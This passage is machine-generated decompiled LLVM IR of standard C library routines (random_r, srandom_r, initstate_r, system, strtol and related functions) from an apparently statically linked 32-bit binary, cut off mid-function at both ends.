  %v3_80610bd = load i32, i32* %v2_80610bd, align 4
  store i32 %v3_80610bd, i32* %esi.global-to-local, align 4
  %v1_80610c0 = icmp eq i1 %v4_80610b9, false
  br i1 %v1_80610c0, label %dec_label_pc_80610d9, label %dec_label_pc_80610c2

dec_label_pc_80610c2:                             ; preds = %entry
  %v2_80610c2 = inttoptr i32 %v3_80610bd to i32*
  %v3_80610c2 = load i32, i32* %v2_80610c2, align 4
  %v5_80610c2 = mul i32 %v3_80610c2, 1103515245
  %v1_80610c8 = add i32 %v5_80610c2, 12345
  %v1_80610cd = urem i32 %v1_80610c8, -2147483648
  store i32 %v1_80610cd, i32* %eax.global-to-local, align 4
  store i32 %v1_80610cd, i32* %v2_80610c2, align 4
  %v0_80610d4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80610d4 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80610d4 = inttoptr i32 %v1_80610d4 to i32*
  store i32 %v0_80610d4, i32* %v2_80610d4, align 4
  br label %dec_label_pc_8061104

dec_label_pc_80610d9:                             ; preds = %entry
  %v1_80610d9 = add i32 %tmp3, 4
  %v2_80610d9 = inttoptr i32 %v1_80610d9 to i32*
  %v3_80610d9 = load i32, i32* %v2_80610d9, align 4
  store i32 %v3_80610d9, i32* @ecx, align 4
  %v2_80610dc = load i32, i32* %arg1, align 4
  store i32 %v2_80610dc, i32* %edx.global-to-local, align 4
  %v1_80610de = add i32 %tmp3, 24
  %v2_80610de = inttoptr i32 %v1_80610de to i32*
  %v3_80610de = load i32, i32* %v2_80610de, align 4
  store i32 %v3_80610de, i32* %edi.global-to-local, align 4
  %v1_80610e1 = inttoptr i32 %v3_80610d9 to i32*
  %v2_80610e1 = load i32, i32* %v1_80610e1, align 4
  store i32 %v2_80610e1, i32* %eax.global-to-local, align 4
  %v1_80610e3 = inttoptr i32 %v2_80610dc to i32*
  %v2_80610e3 = load i32, i32* %v1_80610e3, align 4
  %v4_80610e3 = add i32 %v2_80610e3, %v2_80610e1
  store i32 %v4_80610e3, i32* %v1_80610e3, align 4
  %v0_80610e5 = load i32, i32* %edx.global-to-local, align 4
  %v1_80610e5 = inttoptr i32 %v0_80610e5 to i32*
  %v2_80610e5 = load i32, i32* %v1_80610e5, align 4
  %v1_80610e7 = add i32 %v0_80610e5, 4
  store i32 %v1_80610e7, i32* %edx.global-to-local, align 4
  %v2_80610ea = udiv i32 %v2_80610e5, 2
  %v1_80610ec = load i32, i32* %edi.global-to-local, align 4
  %v7_80610ec = icmp ult i32 %v1_80610e7, %v1_80610ec
  %v1_80610ee = load i32, i32* %ebp.global-to-local, align 4
  %v2_80610ee = inttoptr i32 %v1_80610ee to i32*
  store i32 %v2_80610ea, i32* %v2_80610ee, align 4
  %v0_80610f1 = load i32, i32* @ecx, align 4
  %v1_80610f1 = add i32 %v0_80610f1, 4
  store i32 %v1_80610f1, i32* %eax.global-to-local, align 4
  br i1 %v7_80610ec, label %dec_label_pc_80610fa, label %dec_label_pc_80610f6

dec_label_pc_80610f6:                             ; preds = %dec_label_pc_80610d9
  %v0_80610f6 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_80610f6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80610ff

dec_label_pc_80610fa:                             ; preds = %dec_label_pc_80610d9
  %v1_80610fa = load i32, i32* %edi.global-to-local, align 4
  %v7_80610fa = icmp ult i32 %v1_80610f1, %v1_80610fa
  %v1_80610fc = icmp eq i1 %v7_80610fa, false
  %v3_80610fc = load i32, i32* %esi.global-to-local, align 4
  %v4_80610fc = select i1 %v1_80610fc, i32 %v3_80610fc, i32 %v1_80610f1
  store i32 %v4_80610fc, i32* %eax.global-to-local, align 4
  %v0_80610ff.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80610ff

dec_label_pc_80610ff:                             ; preds = %dec_label_pc_80610f6, %dec_label_pc_80610fa
  %v0_80610ff = phi i32 [ %v0_80610f6, %dec_label_pc_80610f6 ], [ %v0_80610ff.pre, %dec_label_pc_80610fa ]
  %v1_80610ff = load i32, i32* %ebx.global-to-local, align 4
  %v2_80610ff = inttoptr i32 %v1_80610ff to i32*
  store i32 %v0_80610ff, i32* %v2_80610ff, align 4
  %v0_8061101 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061101 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061101 = add i32 %v1_8061101, 4
  %v3_8061101 = inttoptr i32 %v2_8061101 to i32*
  store i32 %v0_8061101, i32* %v3_8061101, align 4
  br label %dec_label_pc_8061104

dec_label_pc_8061104:                             ; preds = %dec_label_pc_80610c2, %dec_label_pc_80610ff
  %v2_8061104 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8061104, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80610cd, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8061104, { 1, 0 }
  uselistorder label %dec_label_pc_80610ff, { 1, 0 }
}

define i32 @srandom_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_806110b = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_806110f = load i32, i32* @edi, align 4
  %v0_8061110 = load i32, i32* @esi, align 4
  %v0_8061111 = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_806111d = add i32 %tmp14, 12
  %v2_806111d = inttoptr i32 %v1_806111d to i32*
  %v3_806111d = load i32, i32* %v2_806111d, align 4
  store i32 %v3_806111d, i32* %ecx.global-to-local, align 4
  %v6_8061123 = icmp ugt i32 %v3_806111d, 4
  br i1 %v6_8061123, label %dec_label_pc_806119d, label %dec_label_pc_8061125

dec_label_pc_8061125:                             ; preds = %entry
  %v1_8061125 = add i32 %tmp14, 8
  %v2_8061125 = inttoptr i32 %v1_8061125 to i32*
  %v3_8061125 = load i32, i32* %v2_8061125, align 4
  store i32 %v3_8061125, i32* %ebx.global-to-local, align 4
  %v1_8061128 = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_806112f = select i1 %v1_8061128, i32 1, i32 %arg1
  store i32 %v3_806112f, i32* %edx.global-to-local, align 4
  %v1_8061132 = icmp eq i32 %v3_806111d, 0
  %v2_8061134 = inttoptr i32 %v3_8061125 to i32*
  store i32 %v3_806112f, i32* %v2_8061134, align 4
  br i1 %v1_8061132, label %dec_label_pc_806119b, label %dec_label_pc_8061138

dec_label_pc_8061138:                             ; preds = %dec_label_pc_8061125
  %v0_8061138 = load i32, i32* @esi, align 4
  %v1_8061138 = add i32 %v0_8061138, 16
  %v2_8061138 = inttoptr i32 %v1_8061138 to i32*
  %v3_8061138 = load i32, i32* %v2_8061138, align 4
  store i32 %v3_8061138, i32* %eax.global-to-local, align 4
  %v0_806113b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_806113b, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_8061142 = sext i32 %v3_8061138 to i64
  store i64 %v4_8061142, i64* %stack_var_-40, align 8
  %v5_806117832 = icmp sgt i32 %v3_8061138, 1
  br i1 %v5_806117832, label %dec_label_pc_8061147, label %dec_label_pc_806117a

dec_label_pc_8061147:                             ; preds = %dec_label_pc_8061138, %dec_label_pc_8061147.dec_label_pc_8061147_crit_edge
  %v0_806116f = phi i32 [ %v0_806116f.pre, %dec_label_pc_8061147.dec_label_pc_8061147_crit_edge ], [ %v0_806113b, %dec_label_pc_8061138 ]
  %v0_8061147 = load i32, i32* %edx.global-to-local, align 4
  %v1_806114e = ashr i32 %v0_8061147, 31
  %v2_806114f = zext i32 %v0_8061147 to i64
  %v4_806114f = zext i32 %v1_806114e to i64
  %v5_806114f = mul nuw i64 %v4_806114f, 4294967296
  %v6_806114f = or i64 %v5_806114f, %v2_806114f
  %v8_806114f = sdiv i64 %v6_806114f, 127773
  %v9_806114f = trunc i64 %v8_806114f to i32
  %v10_806114f = srem i64 %v6_806114f, 127773
  %v3_8061155 = mul nsw i64 %v10_806114f, 16807
  %v4_8061155 = trunc i64 %v3_8061155 to i32
  %tmp24 = mul i32 %v9_806114f, -2836
  %v2_8061161 = add i32 %v4_8061155, %tmp24
  %v1_8061163 = add i32 %v2_8061161, 1
  %v6_8061163 = xor i32 %v2_8061161, -2147483648
  %v7_8061163 = xor i32 %v1_8061163, %v2_8061161
  %v8_8061163 = and i32 %v7_8061163, %v6_8061163
  %v9_8061163 = icmp slt i32 %v8_8061163, 0
  %v10_8061163 = icmp eq i32 %v1_8061163, 0
  %v11_8061163 = icmp slt i32 %v1_8061163, 0
  %v1_8061166 = add i32 %v2_8061161, 2147483647
  store i32 %v1_8061166, i32* %eax.global-to-local, align 4
  %v3_806116c = icmp ne i1 %v11_8061163, %v9_8061163
  %v4_806116c = or i1 %v10_8061163, %v3_806116c
  %v7_806116c = select i1 %v4_806116c, i32 %v1_8061166, i32 %v2_8061161
  store i32 %v7_806116c, i32* %edx.global-to-local, align 4
  %v1_806116f = add i32 %v0_806116f, 4
  store i32 %v1_806116f, i32* %ecx.global-to-local, align 4
  %v2_8061172 = inttoptr i32 %v1_806116f to i32*
  store i32 %v7_806116c, i32* %v2_8061172, align 4
  %v0_8061174 = load i32, i32* @edi, align 4
  %v1_8061174 = add i32 %v0_8061174, 1
  store i32 %v1_8061174, i32* @edi, align 4
  %v3_8061175.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_8061175.pre to i32
  %v5_8061178 = icmp slt i32 %v1_8061174, %extract.t11
  br i1 %v5_8061178, label %dec_label_pc_8061147.dec_label_pc_8061147_crit_edge, label %dec_label_pc_8061175.dec_label_pc_806117a_crit_edge

dec_label_pc_8061147.dec_label_pc_8061147_crit_edge: ; preds = %dec_label_pc_8061147
  %v0_806116f.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8061147

dec_label_pc_8061175.dec_label_pc_806117a_crit_edge: ; preds = %dec_label_pc_8061147
  %v0_806117a.pre = load i32, i32* @esi, align 4
  %v0_806117d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_806117a

dec_label_pc_806117a:                             ; preds = %dec_label_pc_8061175.dec_label_pc_806117a_crit_edge, %dec_label_pc_8061138
  %v0_806117d = phi i32 [ %v0_806117d.pre, %dec_label_pc_8061175.dec_label_pc_806117a_crit_edge ], [ %v0_806113b, %dec_label_pc_8061138 ]
  %v0_806117a = phi i32 [ %v0_806117a.pre, %dec_label_pc_8061175.dec_label_pc_806117a_crit_edge ], [ %v0_8061138, %dec_label_pc_8061138 ]
  %v1_806117a = add i32 %v0_806117a, 20
  %v2_806117a = inttoptr i32 %v1_806117a to i32*
  %v3_806117a = load i32, i32* %v2_806117a, align 4
  store i32 %v3_806117a, i32* %eax.global-to-local, align 4
  %v2_806117d = add i32 %v0_806117a, 4
  %v3_806117d = inttoptr i32 %v2_806117d to i32*
  store i32 %v0_806117d, i32* %v3_806117d, align 4
  %v0_8061180 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061180 = load i32, i32* %eax.global-to-local, align 4
  %v2_8061180 = mul i32 %v1_8061180, 4
  %v3_8061180 = add i32 %v2_8061180, %v0_8061180
  store i32 %v3_8061180, i32* %eax.global-to-local, align 4
  %v1_8061183 = load i32, i32* @esi, align 4
  %v2_8061183 = inttoptr i32 %v1_8061183 to i32*
  store i32 %v3_8061180, i32* %v2_8061183, align 4
  %v3_8061185 = load i64, i64* %stack_var_-40, align 8
  %v6_8061185 = mul nsw i64 %v3_8061185, 10
  %v7_8061185 = trunc i64 %v6_8061185 to i32
  %v2_806118b = ptrtoint i32* %stack_var_-20 to i32
  %v1_806119825 = add i32 %v7_8061185, -1
  %v9_806119829 = icmp slt i32 %v1_806119825, 0
  store i32 %v1_806119825, i32* @ebx, align 4
  %v1_806119930 = icmp eq i1 %v9_806119829, false
  br i1 %v1_806119930, label %dec_label_pc_806118b, label %dec_label_pc_806119b

dec_label_pc_806118b:                             ; preds = %dec_label_pc_806117a, %dec_label_pc_806118b
  store i32 %v2_806118b, i32* %eax.global-to-local, align 4
  %v0_8061190 = load i32, i32* @esi, align 4
  %v2_8061191 = inttoptr i32 %v0_8061190 to i32*
  %v3_8061191 = call i32 @__GI_random_r(i32* %v2_8061191, i32 %v2_806118b)
  store i32 %v0_8061190, i32* %eax.global-to-local, align 4
  store i32 %v2_806118b, i32* %edx.global-to-local, align 4
  %v0_8061198.pre = load i32, i32* @ebx, align 4
  %v1_8061198 = add i32 %v0_8061198.pre, -1
  %v9_8061198 = icmp slt i32 %v1_8061198, 0
  store i32 %v1_8061198, i32* @ebx, align 4
  %v1_8061199 = icmp eq i1 %v9_8061198, false
  br i1 %v1_8061199, label %dec_label_pc_806118b, label %dec_label_pc_806119b

dec_label_pc_806119b:                             ; preds = %dec_label_pc_806117a, %dec_label_pc_806118b, %dec_label_pc_8061125
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806119d

dec_label_pc_806119d:                             ; preds = %entry, %dec_label_pc_806119b
  %v0_80611a4 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_806119b ]
  store i32 %v0_8061111, i32* @ebx, align 4
  store i32 %v0_8061110, i32* @esi, align 4
  store i32 %v0_806110f, i32* @edi, align 4
  store i32 %v0_806110b, i32* @ebp, align 4
  ret i32 %v0_80611a4

; uselistorder directives
  uselistorder i32 %v1_8061198, { 1, 0 }
  uselistorder i32 %v0_806117a, { 1, 0 }
  uselistorder i32 %v1_8061163, { 2, 1, 0 }
  uselistorder i32 %v2_8061161, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_806113b, { 1, 0, 2 }
  uselistorder i32 %v3_806111d, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_806119d, { 1, 0 }
  uselistorder label %dec_label_pc_806119b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_806118b, { 1, 0 }
  uselistorder label %dec_label_pc_8061147, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_80611a5 = load i32, i32* @ebp, align 4
  %v0_80611a6 = load i32, i32* @edi, align 4
  %v0_80611a8 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_80611c9, label %dec_label_pc_80611bd

dec_label_pc_80611bd:                             ; preds = %entry
  %v2_80611bd = icmp ult i32 %arg3, 256
  %v1_80611c4 = select i1 %v2_80611bd, i32 5, i32 4
  store i32 %v1_80611c4, i32* @ebx, align 4
  br label %dec_label_pc_80611df

dec_label_pc_80611c9:                             ; preds = %entry
  %v6_80611cc = icmp ugt i32 %arg3, 31
  br i1 %v6_80611cc, label %dec_label_pc_80611d7, label %dec_label_pc_80611ce

dec_label_pc_80611ce:                             ; preds = %dec_label_pc_80611c9
  store i32 0, i32* @ebx, align 4
  %v6_80611d3 = icmp ugt i32 %arg3, 7
  br i1 %v6_80611d3, label %dec_label_pc_80611df, label %dec_label_pc_806122f

dec_label_pc_80611d7:                             ; preds = %dec_label_pc_80611c9
  %v2_80611d7 = icmp ult i32 %arg3, 64
  %v1_80611dc = select i1 %v2_80611d7, i32 3, i32 2
  store i32 %v1_80611dc, i32* @ebx, align 4
  br label %dec_label_pc_80611df

dec_label_pc_80611df:                             ; preds = %dec_label_pc_80611ce, %dec_label_pc_80611bd, %dec_label_pc_80611d7
  %v0_80611e9 = phi i32 [ 0, %dec_label_pc_80611ce ], [ %v1_80611c4, %dec_label_pc_80611bd ], [ %v1_80611dc, %dec_label_pc_80611d7 ]
  %v1_80611df = mul nuw nsw i32 %v0_80611e9, 4
  %v2_80611df = add i32 %v1_80611df, ptrtoint (i32* @global_var_806e5d4.708 to i32)
  %v3_80611df = inttoptr i32 %v2_80611df to i32*
  %v4_80611df = load i32, i32* %v3_80611df, align 4
  store i32 %v4_80611df, i32* %eax.global-to-local, align 4
  %v1_80611e6 = add i32 %tmp7, 4
  store i32 %v1_80611e6, i32* @esi, align 4
  %v2_80611e9 = add i32 %v1_80611df, ptrtoint (i32* @global_var_806e5c0.709 to i32)
  %v3_80611e9 = inttoptr i32 %v2_80611e9 to i32*
  %v4_80611e9 = load i32, i32* %v3_80611e9, align 4
  store i32 %v4_80611e9, i32* %edx.global-to-local, align 4
  %v2_80611f0 = add i32 %arg4, 12
  %v3_80611f0 = inttoptr i32 %v2_80611f0 to i32*
  store i32 %v0_80611e9, i32* %v3_80611f0, align 4
  %v0_80611f3 = load i32, i32* @esi, align 4
  %v1_80611f3 = load i32, i32* @edi, align 4
  %v2_80611f3 = add i32 %v1_80611f3, 8
  %v3_80611f3 = inttoptr i32 %v2_80611f3 to i32*
  store i32 %v0_80611f3, i32* %v3_80611f3, align 4
  %v0_80611f6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80611f6 = load i32, i32* @edi, align 4
  %v2_80611f6 = add i32 %v1_80611f6, 16
  %v3_80611f6 = inttoptr i32 %v2_80611f6 to i32*
  store i32 %v0_80611f6, i32* %v3_80611f6, align 4
  %v0_80611f9 = load i32, i32* @esi, align 4
  %v1_80611f9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80611f9 = mul i32 %v1_80611f9, 4
  %v3_80611f9 = add i32 %v2_80611f9, %v0_80611f9
  store i32 %v3_80611f9, i32* %eax.global-to-local, align 4
  %v0_80611fc = load i32, i32* %edx.global-to-local, align 4
  %v1_80611fc = load i32, i32* @edi, align 4
  %v2_80611fc = add i32 %v1_80611fc, 20
  %v3_80611fc = inttoptr i32 %v2_80611fc to i32*
  store i32 %v0_80611fc, i32* %v3_80611fc, align 4
  %v0_80611ff = load i32, i32* %eax.global-to-local, align 4
  %v1_80611ff = load i32, i32* @edi, align 4
  %v2_80611ff = add i32 %v1_80611ff, 24
  %v3_80611ff = inttoptr i32 %v2_80611ff to i32*
  store i32 %v0_80611ff, i32* %v3_80611ff, align 4
  %v0_8061202 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8061207 = inttoptr i32 %v0_8061202 to i32*
  %v3_8061207 = call i32 @srandom_r(i32 %arg1, i32* %v2_8061207)
  %v0_806120c = load i32, i32* @ebp, align 4
  %v1_806120c = inttoptr i32 %v0_806120c to i32*
  store i32 0, i32* %v1_806120c, align 4
  %v2_8061213 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_8061213, i32* @ecx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8061217 = load i32, i32* @ebx, align 4
  %v1_8061217 = icmp eq i32 %v0_8061217, 0
  br i1 %v1_8061217, label %dec_label_pc_8061248, label %dec_label_pc_806121b

dec_label_pc_806121b:                             ; preds = %dec_label_pc_80611df
  %v0_806121b = load i32, i32* @edi, align 4
  %v1_806121b = add i32 %v0_806121b, 4
  %v2_806121b = inttoptr i32 %v1_806121b to i32*
  %v3_806121b = load i32, i32* %v2_806121b, align 4
  %v1_806121e = load i32, i32* @esi, align 4
  %v2_806121e = sub i32 %v3_806121b, %v1_806121e
  %v2_8061220 = sdiv i32 %v2_806121e, 4
  %v3_8061223 = mul i32 %v2_8061220, 5
  %v2_8061226 = add i32 %v3_8061223, %v0_8061217
  %v1_8061228 = load i32, i32* @ebp, align 4
  %v2_8061228 = inttoptr i32 %v1_8061228 to i32*
  store i32 %v2_8061226, i32* %v2_8061228, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061248

dec_label_pc_806122f:                             ; preds = %dec_label_pc_80611ce
  %v1_806122f = call i32 @__errno_location(i32 %v0_80611a8)
  store i32 %v1_806122f, i32* %eax.global-to-local, align 4
  %v1_8061234 = inttoptr i32 %v1_806122f to i32*
  store i32 22, i32* %v1_8061234, align 4
  %v0_806123a = load i32, i32* %stack_var_-36, align 4
  %v1_806123a = call i32 @__errno_location(i32 %v0_806123a)
  %v1_806123f = inttoptr i32 %v1_806123a to i32*
  store i32 22, i32* %v1_806123f, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061248

dec_label_pc_8061248:                             ; preds = %dec_label_pc_80611df, %dec_label_pc_806121b, %dec_label_pc_806122f
  %v0_806124f = phi i32 [ 0, %dec_label_pc_80611df ], [ 0, %dec_label_pc_806121b ], [ -1, %dec_label_pc_806122f ]
  store i32 %v0_80611a8, i32* @ebx, align 4
  store i32 %v0_80611a6, i32* @edi, align 4
  store i32 %v0_80611a5, i32* @ebp, align 4
  ret i32 %v0_806124f

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8061248, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80611df, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v4_8061259 = icmp eq i32 %arg1, 0
  br i1 %v4_8061259, label %dec_label_pc_806137c, label %dec_label_pc_8061264

dec_label_pc_8061264:                             ; preds = %entry
  %v2_806126a = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8061279 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_8061288 = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_8061291 = call i32 @__vfork(i32 %v2_8061288)
  %v2_8061299 = icmp slt i32 %v1_8061291, 0
  store i32 %v1_8061291, i32* @ebx, align 4
  %v2_806129e = icmp eq i1 %v2_8061299, false
  br i1 %v2_806129e, label %dec_label_pc_80612cf, label %dec_label_pc_80612a0

dec_label_pc_80612a0:                             ; preds = %dec_label_pc_8061264
  %v2_80612a8 = call i32 @__bsd_signal(i32 3, i32 %v2_806126a)
  store i32 %v2_806126a, i32* @edx, align 4
  %v2_80612b5 = call i32 @__bsd_signal(i32 2, i32 %v2_8061279)
  store i32 2, i32* @ebx, align 4
  %v2_80612c2 = call i32 @__bsd_signal(i32 17, i32 %v2_8061288)
  br label %dec_label_pc_8061379

dec_label_pc_80612cf:                             ; preds = %dec_label_pc_8061264
  %v1_8061299 = icmp eq i32 %v1_8061291, 0
  %v1_80612cf = icmp eq i1 %v1_8061299, false
  br i1 %v1_80612cf, label %dec_label_pc_806131b, label %dec_label_pc_80612d1

dec_label_pc_80612d1:                             ; preds = %dec_label_pc_80612cf
  %v2_80612d7 = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_80612e2 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_80612ed = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_806130c = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_806d8cb.645 to i32), i32 ptrtoint ([3 x i8]* @global_var_806d8d0.644 to i32), i32 ptrtoint ([3 x i8]* @global_var_806d8c8.643 to i32), i32 %arg1, i32 0)
  %v1_8061316 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_806131b:                             ; preds = %dec_label_pc_80612cf
  %v2_8061321 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_806132c = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_8061331 = ptrtoint i32* %stack_var_-8 to i32
  %v0_806133a = load i32, i32* @ebx, align 4
  %v7_806133b = call i32 @wait4(i32 %v0_806133a, i32 %v2_8061331, i32 0, i32 0)
  %v8_8061346 = icmp eq i32 %v7_806133b, -1
  %v1_8061347 = icmp eq i1 %v8_8061346, false
  %v6_8061347 = load i32, i32* %stack_var_-8, align 4
  %v7_8061347 = select i1 %v1_8061347, i32 %v6_8061347, i32 -1
  store i32 %v7_8061347, i32* @edx, align 4
  store i32 %v7_8061347, i32* %stack_var_-8, align 4
  %v2_8061356 = call i32 @__bsd_signal(i32 3, i32 %v2_806126a)
  store i32 3, i32* @ecx, align 4
  store i32 %v2_806126a, i32* @ebx, align 4
  %v2_8061363 = call i32 @__bsd_signal(i32 2, i32 %v2_8061279)
  store i32 %v2_8061279, i32* @edx, align 4
  %v2_8061370 = call i32 @__bsd_signal(i32 17, i32 %v2_8061288)
  %v3_8061375 = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8061379

dec_label_pc_8061379:                             ; preds = %dec_label_pc_80612a0, %dec_label_pc_806131b
  %storemerge = phi i32 [ -1, %dec_label_pc_80612a0 ], [ %v3_8061375, %dec_label_pc_806131b ]
  br label %dec_label_pc_806137c

dec_label_pc_806137c:                             ; preds = %entry, %dec_label_pc_8061379
  %v0_8061380 = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_8061379 ]
  ret i32 %v0_8061380

; uselistorder directives
  uselistorder i32 %v1_8061291, { 2, 0, 1 }
  uselistorder i32 %v2_8061288, { 1, 0, 2 }
  uselistorder i32 %v2_8061279, { 0, 2, 1 }
  uselistorder i32 %v2_806126a, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0, 3, 2 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_806137c, { 1, 0 }
  uselistorder label %dec_label_pc_8061379, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_806138f = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_806138f
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_80613a9 = inttoptr i32 %arg1 to i8*
  %v5_80613a9 = call i32 @_stdlib_strto_l(i8* %v4_80613a9, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_80613a9
}

define i32 @strtoul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_80613c5 = inttoptr i32 %arg1 to i8*
  %v5_80613c5 = call i32 @_stdlib_strto_l(i8* %v4_80613c5, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v5_80613c5
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80613d3 = load i32, i32* @ebx, align 4
  store i32 %v0_80613d3, i32* %stack_var_-16, align 4
  %v4_80613d7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80613d7, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_80613df = load i32, i32* @global_var_8075640, align 64
  store i32 %v0_80613df, i32* %edx.global-to-local, align 4
  store i32 %v4_80613d7, i32* %ebx.global-to-local, align 4
  %v2_80613ea41 = load i8, i8* %arg1, align 1
  %v3_80613ea42 = sext i8 %v2_80613ea41 to i32
  store i32 %v3_80613ea42, i32* %eax.global-to-local, align 4
  %v2_80613ed43 = mul nsw i32 %v3_80613ea42, 2
  %v3_80613ed44 = add i32 %v2_80613ed43, %v0_80613df
  %v4_80613ed45 = inttoptr i32 %v3_80613ed44 to i8*
  %v5_80613ed46 = load i8, i8* %v4_80613ed45, align 1
  %v6_80613ed47 = and i8 %v5_80613ed46, 32
  %v7_80613ed48 = icmp eq i8 %v6_80613ed47, 0
  %v1_80613f149 = icmp eq i1 %v7_80613ed48, false
  br i1 %v1_80613f149, label %dec_label_pc_80613e9, label %dec_label_pc_80613f3

dec_label_pc_80613e9:                             ; preds = %entry, %dec_label_pc_80613e9
  %v0_80613e950 = phi i32 [ %v1_80613e9, %dec_label_pc_80613e9 ], [ %v4_80613d7, %entry ]
  %v1_80613e9 = add i32 %v0_80613e950, 1
  store i32 %v1_80613e9, i32* %ebx.global-to-local, align 4
  %v1_80613ea = inttoptr i32 %v1_80613e9 to i8*
  %v2_80613ea = load i8, i8* %v1_80613ea, align 1
  %v3_80613ea = sext i8 %v2_80613ea to i32
  store i32 %v3_80613ea, i32* %eax.global-to-local, align 4
  %v2_80613ed = mul nsw i32 %v3_80613ea, 2
  %v3_80613ed = add i32 %v2_80613ed, %v0_80613df
  %v4_80613ed = inttoptr i32 %v3_80613ed to i8*
